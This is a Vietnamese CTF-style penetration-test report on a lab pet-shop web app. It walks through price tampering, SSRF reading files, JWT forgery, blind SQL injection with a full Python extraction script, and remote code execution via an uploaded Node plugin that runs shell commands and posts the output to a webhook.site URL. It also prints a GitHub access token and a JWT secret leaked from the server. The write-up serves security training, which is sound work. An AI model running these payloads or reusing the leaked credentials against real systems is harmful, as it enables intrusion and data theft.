# Báo cáo lỗ hổng CyberJustu

*author: Trần Phạm Hải Dương-sp4rkl3*

*email: duongtran1806ap@gmail.com*

# Tổng quan

Đây là báo cáo về lỗ hổng của ứng dụng shop thú cưng Musoe 

Đường dẫn của trang web: 

- `musoe.cyberjutsu-lab.tech`
- `*.musoe.cyberjutsu-lab.tech`

### Phạm vi:

Quá trình kiểm thử được thực hiện trong môi trường Cyberjutsy Academy cung cấp, không gây ảnh hưởng đến hệ thống thực tế. Được thực hiện dưới hình thức **kiểm thử Blackbox**. Mục tiêu là xác định các lỗ hổng bảo mật tiềm ẩn có thể bị khai thác bởi các tác nhân độc hại từ bên ngoài.

### Tổng quan lỗ hổng:

Trong quá trình kiểm thử đã phát hiện ra 5 lỗ hổng:

- Tiết lộ thông tin nhạy cảm (mã nguồn, dữ liệu hệ thống, thông tin người dùng), kèm theo đó là link mà nguồn của trang web **Musoe**  [link.git](https://sillymeomeo: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@github.com/sillymeomeo/ecommerce-backend.git)
- Gian lận mua tất cả mặt hàng với số dư bằng 0
- Được phép xem thông tin từ những user khác một cách bất hợp pháp
- Thực thi mã độc RCE trên server

# Bug 01: Broken Access Control(Bussiness Logic Flaw)

### 1. Mô tả và tác động:

Khi thực hiện thao tác mua sản phẩm, `/api/v2/orders/create` thực hiện thao tác tạo ra 1 order mới và đồng thời thực hiện thao tác trừ tiền vào blalence của người dùng. Tuy nhiên ở đây sever đã không kiểm tra kĩ request của người dung, người dùng hoàn toàn có thể thay đổi giá trị `price` của sản phẩm để có thể gian lận và mua được sản phẩm họ muốn với bất kì giá tiền nào. 

**Severity: Medium**

Lỗ hồng này gây ra hậu quả nghiêm trọng, gây thất thoát doanh thu cho doanh nghiệp.

### 2. Root-Cause:

Tại file `orderController.js` tại dòng 64, chương trình đã thực hiện tính balance được nhận trực tiếp từ client thay vì lấy dữ liệu đó từ database , từ đó attacker hoàn toàn có thể thao túng giá cả của price để có thể lấy bất cứ sản phẩm nào hắn ta muốn

![image.png](image/image%20.png)

### 3. Tiến hành khai thác:

Khi tiến hành mua 1 sản phẩm sẽ có gói tin `POST` được gửi đi như thế này:

![image.png](image%201.png)

Tuy nhiên ở đây ta có thể sửa giá trị của `"id":1` và `"price":0` ta đã có thể mua được Flag với giá 0đ

![image.png](image%202.png)

Ta đã thành công lấy được **Flag1:CBJS{ab413281962b76090c0db9051c05d2f2}**

### 4. Khuyến nghị khắc phục:

- Thực hiện `updateBalance` từ dữ liệu từ database, không tin tưởng và tham số và status từ client, cần xác định dựa trên dữ liệu đến từ database

---

# Bug 02: SSRF

### 1. Mô tả và tác động:

Tại trang [`https://musoe.cyberjutsu-lab.tech/api/v2/image/resize`](https://musoe.cyberjutsu-lab.tech/api/v2/image/resize?image=) tham số `image` thực hiện request đến một server phụ [`http://cdn.musoe.cyberjutsu-lab.tech`](http://cdn.musoe.cyberjutsu-lab.tech/) có chứa hình ảnh và hiển thị lên cho người dùng. Tuy nhiên ở đây lại không có bất kì biện pháp kiểm tra url được truyền vào, người dùng hoàn toàn có thể tùy chỉnh input thành [`file://`](file://) để tiến hành truy cập vào file của server. 

**Severity: High**

Lỗ hổng này cực kì nghiêm trọng, có thể dẫn đến lộ mã nguồn của trang web, hoặc lộ những thông tin nhạy cảm có trong các file hệ thống.

### 2. Root-Cause:

Tại file `imageController.js` ở tại dòng 30, thấy rằng khi muốn lấy hình ảnh để hiển thị cho user server sẽ gửi 1 request tới 1 URL để get hình ảnh về cho user. Tuy nhiên ở đây không hề có bất cứ 1 biện pháp lọc input nào.

![image.png](image%203.png)

### 3. Tiến hành khai thác:

Khi thử truy cập vào file `/etc/passwd` server báo lỗi nhưng lại để lộ ra các file tồn tại trong hệ thống

![image.png](image%204.png)

Thử truy cập vào file `/usr/app/src/controllers/imageController.js` và thấy rằng ssrf thực sự hoạt động 

![image.png](image%205.png)

Ta tiếp tục vào file `/usr/app/src/.env` để kiểm tra môi trường của server

![image.png](image%206.png)

Tại đây ta thu được **FLAG2=CBJS{4d2c7fee2a055bd1e319826229f019db}.** 

Bên cạnh đó ta còn có được các thông tin quan trọng khác : 

- `JWT_SECRET=5a673956ce1d9aa666f9a2a99b409c0e` dùng để tạo token
- Ngoài ra còn có cả thông tin github của người dev đã làm ra trang web nay, từ đây có thể truy cập vào và lấy được source code về

```
GITHUB_USER=sillymeomeo
GITHUB_TOKEN=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
GITHUB_REPOSITORY=sillymeomeo/ecommerce-backend
```

### 4. Khuyến nghị khắc phục:

- Chỉ cho phép fetch từ CDN/hostname tin cậy ( `cdn.musoe.cyberjutsu-lab.tech`)
- Chỉ chấp nhận schema như là `http`/ `https` từ chối các schema có thể để lộ thông tin như `file://` , `ftp://`, `data:` ,vv
- Trước khi fetch, từ chối nếu địa chỉ IP là private/loopback/link-local hoặc thuộc range nội bộ

---

# Bug 03: Broken Access Control

### 1. Mô tả và tác động:

Ở chức năng  `login` sau khi đăng nhập xong sẽ có token của user đăng nhập được sinh ra, từ `JWT_SECRET` có được ở lỗi trên, ta có thể tạo ra một fake token của user khác. Với fake token đó ta có thể thực hiện các thao tác như xem thông tin, mua sản phẩm dưới danh tài khoản của user khác

**Severity: Medium**

Lỗ hổng này khiến thông tin cá nhân và nhạy cảm như là: username, email, lịch sử mua hàng,.. của user sẽ bị lộ. Điều này sẽ ảnh hướng đến uy tín và lợi nhuận của doanh nghiệp

### 2. Root-Cause:

Ở đây chính vì `JWT_SECRET` bị lộ nên attacker hoàn toàn có thể cho ra một fake token hợp lệ và bypass dễ dàng

### 3. Tiến hành khai thác:

Ta lấy token có được khi login server và đẩy lên [`jwt.io`](http://jwt.io) , ta sẽ thu được thông tin dùng để xác thực của user 

![image.png](image%207.png)

  

![image.png](image%208.png)

Sau đó ta tiến hành sửa `"id":1` và `"username":conmeo` ta sẽ thu được token của user con mèo. Sử dụng chính token đó để truy cập vào và xem order của user `conmeo` , sử dụng `GET /api/v2/users/1/orders` và `x-access-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJjb25tZW8iLCJyb2xlIjoidXNlciIsImlhdCI6MTc2MTg3MTgzMywiZXhwIjoxNzYyNDc2NjMzfQ.bL_S3rnQ3FuHepPgCC_4AyRZhX5FjNZbfCnaGXIfLkI`  để có thể vượt quyền 

![image.png](image%209.png)

![image.png](image%2010.png)

Ta đã có thể truy cập được vào orders của `user:conmeo` và thấy được rằng ở đây có 1 flag **FLAG3:CBJS{da825564095d09d173359085b3fe58c0}**

### 4. Khuyến nghị khắc phục:

- Không lưu hoặc commit secret trong mã nguồn; sử dụng **secret manager** an toàn (VD: AWS Secrets Manager, Vault, Docker secrets).
- Đảm bảo token chỉ được ký bởi server với secret hợp lệ, kiểm tra thêm các trường `iss`, `aud`, `exp` để tránh giả mạo.
- Khuyến nghị chuyển sang cơ chế ký **bất đối xứng (RS256)** để giảm rủi ro khi khóa bị lộ.

---

# Bug 04: SQL injection

### 1. Mô tả và tác động:

Chức năng `forgot password` của chương trình chưa hoàn toàn phát triển, tuy nhiên nó vẫn có truy vấn tới email trong Database, nếu email đã tồn tại server sẽ trả về lỗi `This feature is not implemented yet` còn nếu email không tồn tại thì nó sẽ trả về `User not found` . Ta có thể vận dụng lỗi **Blind SQL injection** ở đây.

**Severity: Critical**

Lỗ hổng này có thể làm dữ liệu cá nhân của user bị lộ, ngoài ra nếu tài khoản admin được lưu ở trong DB, hacker vẫn có thể sử dụng tài khoản admin và chiếm quyền admin để điều khiển server.

### 2. Root-cause:

Tại file `/models/user.js` dòng 25 ta thấy rằng đầu vào email ở đây không được kiểm tra cũng như là không có blacklist hoặc withlist giới hạn gì cả

![image.png](image%2011.png)

### 3. Tiến hành khai thác:

Ở phần trên khi leak được `env` của system ta thấy được thông tin rằng Database ở đây là `MYSQL_DATABASE=ecommerce`

![image.png](image%2012.png)

Ta thực hiện câu truy vấn `x@' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='ecommerce'--` để kiểm tra xem UNION SELECT có hoạt động không thì nhận về được kết quả `Error: The used SELECT statements have a different number of columns` , điều này cho thấy rằng `UNION SELECT` hoạt động tốt tuy nhiên ở đây báo lỗi rằng số cột của 2 bảng không trùng nhau

![image.png](image%2013.png)

Sau nhiều lần thử thì ta có được kết luận rằng câu truy vấn này có 8 cột,từ đó những dữ kiện đó ta sẽ thực hiện câu truy vấn SQL injection 

```jsx
{"email":"x@' UNION SELECT 1,2,3,4,5,6,'trigger' FROM information_schema.tables WHERE table_schema='ecommerce' AND table_name='flags'-- "}
```

Sau khi thực hiện được câu truy vấn này ta thấy được respone được trả về là `This feature is not implemented yet` điều này cho thấy rằng bảng flags có tồn tại ở đây

![image.png](image%2014.png)

Tuy nhiên ta không thể lấy trực tiếp flag từ câu truy vấn vì server không trả về kết quả của câu truy vấn mà chỉ trả về True/False

Ta sẽ thực hiện truy vấn Bruce Force nội dung của file để tìm ra nội dung của flags bằng đoạn code python 

```
import requests
import string
import time

# Target setup
url = "https://musoe.cyberjutsu-lab.tech/api/v2/auth/forgot-password"
cookies = {
    "_ga": "GA1.1.1312087310.1758980856",
    "_ga_FYRV1HFMZK": "GS2.1.s1758980855$o1$g1$t1758981455$j60$l0$h0"
}
headers = {
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept-Language": "en-US,en;q=0.9",
    "Accept": "application/json, text/plain, */*",
    "Sec-Ch-Ua": '"Chromium";v="141", "Not?A_Brand";v="8"',
    "Content-Type": "application/json",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Origin": "https://musoe.cyberjutsu-lab.tech",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://musoe.cyberjutsu-lab.tech/forgot-password",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i",
    "Connection": "keep-alive"
}

# Character set: letters, digits, and common special chars
charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?`~"

# The expected "true" response body
EXPECTED_RESPONSE = '{"message":"This feature is not implemented yet"}'

session = requests.Session()

def test_char(position, char):
    # Escape single quotes in char if needed (not necessary here since we control charset)
    payload = f"x@' OR SUBSTRING((SELECT flag FROM flags LIMIT 1), {position}, 1) = '{char}'-- "
    json_data = {"email": payload}
    
    try:
        response = session.post(
            url,
            headers=headers,
            cookies=cookies,
            json=json_data,
            verify=True,
            timeout=10
        )
        # Compare response text (strip whitespace to be safe)
        return response.text.strip() == EXPECTED_RESPONSE
    except Exception as e:
        print(f"[!] Error at position {position}, char '{char}': {e}")
        return False

# Extract flag character by character
flag = ""
position = 1

print("[*] Starting blind SQLi extraction...")

while True:
    found = False
    print(f"\n[*] Trying position {position}...")
    
    for char in charset:
        print(f"  Trying '{char}'", end='\r')
        if test_char(position, char):
            flag += char
            print(f"\n[+] Found: '{char}' at position {position} → flag so far: '{flag}'")
            found = True
            break
    
    # If no character matched, assume end of flag
    if not found:
        # Optional: test for non-printable or space? Or just stop.
        print(f"\n[!] No match at position {position}. Assuming end of flag.")
        break

    position += 1
    # Optional: add delay to avoid rate limiting
    time.sleep(0.2)

print(f"\n[✅] Final flag: {flag}")
```

![image.png](image%2015.png)

Sau khi thực hiện Bruce Force thành công ta thu được nội dung của **FLAG4:CBJS{76906e5c78c1f04ac35a143e4de23a77}**

### 4. Khuyến nghị khắc phục:

- Sử dụng prepared statements / parameterized queries cho mọi truy vấn DB(`db.execute("SELECT * FROM users WHERE email = ?", [email]);`)
- Validate và nomalize input trước khi thực hiện truy vấn: whitelist format email (regex chuẩn), giới hạn độ dài, loại bỏ ký tự không hợp lệ.

---

# Bug 05: RCE thông qua File Upload

### 1. Mô tả và tác động:

Từ việc có thể thao túng `token` ta có thể truy cập vào admin, trong chức năng admin có thể thấy admin có thêm feature xem `ticket` và `plugin` . Tại feature plugin, admin có thể chạy file `.js` được upload lên. Từ đó nếu ta có thể upload những file RCE và thực thi nó trên server.

**Severity: Critical**

Lỗ hổng này có tác động cực kì nghiệm trọng đến hệ thông, attacker hoàn toàn có khả năng tấn công vào trực tiếp hệ thống của server. 

### 2. Root-Cause:

Tại file `pluginController.js` dòng 57 của file thực hiện execute function được truyền vào `plugin.execute();` tuy nhiên ở đây không hề có bất kì một biện pháp lọc input nào.

![image.png](image%2016.png)

### 3. Tiến hành khai thác:

Trước tiên ta tạo 1 token fake admin để có thể truy cập vào các chức năng của admin

![image.png](image%2017.png)

![image.png](image%2018.png)

Sau khi truy cập được vào admin panel thành công, ta tiếp tục truy cập vào plugin để thực hiện upload file và tiến hành RCE. Tuy nhiên chức năng upload không hoạt động, kiểm tra source code của file thì ta thấy được rằng phần upload file đã bị command

![image.png](image%2019.png)

Tại file `pluginServices.js` ta thấy lại tìm được một hàm khác có khả năng upload file và lần này không bị command

![image.png](image%2020.png)

Ta thử tải  `example-plugin.js` về, ta thấy được cấu trúc của file plugin 

![image.png](image%2021.png)

Từ mẫu này ta sẽ viết 1 plugin của mình nhằm mục đích RCE khai thác server. Trước tiên toạn code này sẽ thực hiện câu lệnh `ls /` và gửi kết quả về webhook của mình 

```jsx
const { exec } = require('child_process');

module.exports = {
  execute: () => {
    exec('ls /', (error, stdout, stderr) => {
      if (error) {
        console.error('Command failed:', error);
        return;
      }

      fetch('https://webhook.site/bfa29e84-ae18-4abe-a5c5-0e26898725bd', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ output: stdout })
      })
      .catch(err => {
        console.error('Failed to send data:', err);
      });
    });
  }
};
```

Sau đó ta sẽ thực hiện upload file lên server để có thể RCE. Kiếm tra file `v2/index.js` của server, tìm thấy được `uploadPlugin` nhưng một lần nữa lại bị command ở dòng 37

![image.png](image%2022.png)

Tuy nhiên tại `v1/index.js` thì chức năng `uploadPlugin` có xuất hiện và không bị command

![image.png](image%2023.png)

Từ những thông tin đó, ta tạo một file python có chức năng gửi request POST đến server với chức năng upload file payload `plugin2.js` của ta lên server

```jsx
import requests

burp0_url = "https://musoe.cyberjutsu-lab.tech/api/v1/plugins"
burp0_headers = {"X-Access-Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc2MTc0OTAwNywiZXhwIjoxNzYyMzUzODA3fQ.bJzPhhV9qCNSSMzwseIAtYEvvnALl1MnxGWca-HS5TQ"}
plugin_path='plugin2.js'
name_file='plugin2.js'
with open(plugin_path, "rb") as f:
    files = {"plugin": (name_file, f, "application/javascript")}
    result = requests.post(burp0_url, headers=burp0_headers, files=files)

print(result.status_code)
print(result.text)
```

Sau thực hiện thực thi đoạn code python, ta refresh lại trang web và thấy được rằng file `plugin2.js` đã được xuất hiện trên đó, tiếp tục thực thi file. Kiểm tra lại trang webhook và đã nhận được request tới với nội dụng là cái file và thư mục của đường dân `/` trên server

![image.png](image%2024.png)

![image.png](image%2025.png)

Tại đây ta thu được tên file chứa flag là `FLAG_4277146a23195c2a` , bây giờ sửa lại payload thành     `cat /FLAG_4277146a23195c2a` . Sau đó upload file lên một lần nữa và thực thi file mới up lên

![image.png](image%2026.png)

Ta sẽ thu được **FLAG5:CBJS{632f7879b5bea6fa83696b81e44e3943}**

### 4. Khuyến nghị khắc phục:

- Phải tiến hành đọc nội dung file và lọc các hàm nguy hiểm có thể dấn đến RCE (eval, exec,…) trước khi upload file lên server
- Lưu file ở một thư mục an toàn
- Chạy file với quyền user, **không sử dụng quyền root**

# Kết luận

Qua quá trình kiểm thử hệ thống, tôi đã phát hiện các lỗ hổng bảo mật nghiêm trọng có thể bị khai thác để truy cập trái phép dữ liệu, thực thi mã độc hoặc giả mạo người dùng. Nếu không được khắc phục kịp thời, các lỗ hổng này có thể ảnh hưởng lớn đến tính bảo mật và an toàn của hệ thống. Đề nghị đơn vị vận hành sớm khắc phục các điểm yếu đã phát hiện, đồng thời chủ động rà soát các tính năng xử lý tương tự để phát hiện và vá các lỗ hổng tiềm ẩn. Bên cạnh đó, cần tăng cường kiểm soát đầu vào, xác thực và phân quyền để hạn chế rủi ro bảo mật trong tương lai.
